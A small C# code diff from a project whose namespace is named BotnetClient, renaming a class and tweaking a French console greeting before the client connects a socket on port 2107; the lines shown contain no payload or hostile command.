@@ -11,13 +11,13 @@ using System.Threading;
 
 namespace BotnetClient
 {
-    class master
+    class ClientMaster
     {
         public static Socket senderSock;
 
         static void Main(string[] args)
         {
-            Console.WriteLine("coucou je suis le client");
+            Console.WriteLine("coucou je suis le client!");
             Console.ReadKey();
             SocketClient sc = new SocketClient();
             sc.Connect(2107);
